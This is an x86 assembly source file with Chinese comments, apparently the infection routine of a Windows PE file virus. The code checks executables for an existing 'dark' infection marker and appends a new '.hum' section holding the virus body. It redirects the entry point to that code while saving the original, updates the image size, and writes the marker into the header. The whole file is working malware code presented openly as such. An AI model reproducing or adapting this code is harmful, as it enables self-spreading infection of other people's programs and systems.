;============================modipe.asm 
;修改pe,添加节,实现传染功能 
xchg	eax,esi
;eax为在内存映射文件中的起始地址，它指向文件的开始位置
cmp    word  ptr [esi],'ZM' 
jne    CouldNotInfect 
add    esi,[esi+3ch]        ;指向PE_HEADER 
cmp    word  ptr [esi],'EP' 
jne    CouldNotInfect       ;是否是PE,否则不感染 
cmp    dword ptr [esi+8],'dark'
je     CouldNotInfect 
mov    [ebp+pe_Header],esi  ;保存pe_Header指针 

;清除bound import table
push edi
push eax
xor eax,eax
lea edi,[esi+0D0h]
stosd
stosd
pop eax
pop edi


mov    ecx,[esi+74h]        ;得到directory的数目 
imul   ecx,ecx,8 
lea    eax,[ecx+esi+78h]    ;data directory  eax->节表起始地址 
movzx  ecx,word  ptr [esi+6h];节数目 
imul   ecx,ecx,28h          ;得到所有节表的大小 
add    eax,ecx              ;节结尾... 
xchg   eax,esi              ;eax->Pe_header,esi->最后节开始偏移 
;************************** 
;添加如下节: 
;name .hum 
;VirtualSize==原size+VirSize 
;VirtualAddress= 
;SizeOfRawData 对齐 
;PointerToRawData
;PointerToRelocations dd 0 
;PointerToLinenumbers dd ?   
;NumberOfRelocations  dw  ?   
;NumberOfLinenumbers  dw  ? 
;Characteristics      dd ? 
;************************** 
mov    dword ptr [esi],'muh.'  ;节名.hum 
mov    dword ptr [esi+8],VirusLen ;节的实际大小 

;计算VirtualSize和V.addr 
mov    ebx,[eax+38h]        ;节对齐，在内存中节的对齐粒度 
mov    [ebp+sec_align],ebx
mov    edi,[eax+3ch]        ;文件对齐，在文件中节的对齐粒度
mov    [ebp+file_align],edi

mov    ecx,[esi-40+0ch]     ;上一节的V.addr 
mov    eax,[esi-40+8]       ;上一节的实际大小 
xor    edx,edx 
div    ebx                  ;除以节对齐 
test   edx,edx 
je     @@@1 
inc    eax 
@@@1: 
mul    ebx                  ;上一节在内存中对齐后的节大小 
add    eax,ecx              ;加上上一节的V.addr就是新节的起始V.addr 
mov    [esi+0ch],eax        ;保存新section偏移RVA 
add    eax,_Start-vBegin    ;病毒第一行执行代码，并不是在病毒节的起始处
mov    [ebp+newEip],eax     ;计算新的eip 
mov    dword ptr [esi+24h],0E0000020h    ;节属性 
mov    eax,VirusLen         ;计算SizeOfRawData的大小 
cdq 
div    edi                  ;计算本节的文件对齐 
je     @@@2 
inc    eax 
@@@2: 
mul    edi 
mov    dword ptr [esi+10h],eax ;保存节对齐文件后的大小
mov    eax,[esi-40+14h] 
add    eax,[esi-40+10h] 

mov    [esi+14h],eax        ;PointerToRawData更新 

mov    [ebp+oldEnd],eax     ;病毒代码往HOST文件中的写入点...? 

mov    eax,[ebp+pe_Header] 
inc    word  ptr [eax+6h]   ;更新节数目 
mov    ebx,[eax+28h]        ;eip指针偏移 
;----------------------------------------
mov    [ebp+oldEipTemp],ebx     	;保存老指针 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<新添加的代码
;----------------------------------------
mov    ebx,[ebp+newEip] 
mov    [eax+28h],ebx        ;更新指针值 
;comment $ 
mov    ebx,[eax+50h]        ;更新ImageSize 
add    ebx,VirusLen 
mov    ecx,[ebp+sec_align] 
xor    edx,edx 
xchg   eax,ebx              ;eax和ebx交换... 
cdq 
div    ecx 
test   edx,edx 
je     @@@3 
inc    eax 
@@@3: 
mul    ecx 
xchg   eax,ebx              ;还原  eax->pe_Header 
mov    [eax+50h],ebx   
;保更新后的Image_Size大小=（原Image_size+病毒长度）对齐后的长度  
;$ 
mov    dword ptr [eax+8],'dark' ;病毒感染标志直接写到被感染文件的PE头中
cld
mov    ecx,VirusLen
mov    edi,[ebp+oldEnd]
add    edi,[ebp+pMem]
lea    esi,[ebp+vBegin]
rep    movsb                ;将病毒代码写入目标文件新建的节中! 
;--------------------------------
push   edi    				;<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<新添加的代码
lea    esi,[ebp+oldEipTemp]		;<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<新添加的代码
lea    edi,[edi+(oldEip-vEnd)]		;<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<新添加的代码
movsd					;<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<新添加的代码
pop    edi				;<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<新添加的代码
;--------------------------------
xor    eax,eax 
sub    edi,[ebp+pMem] 
push   FILE_BEGIN 
push   eax 
push   edi 
push   [ebp+hFile] 
call   [ebp+aSetFilePointer];设定文件读写指针
push   [ebp+hFile] 
call   [ebp+aSetEndOfFile]  ; 将当前文件位置设为文件末尾
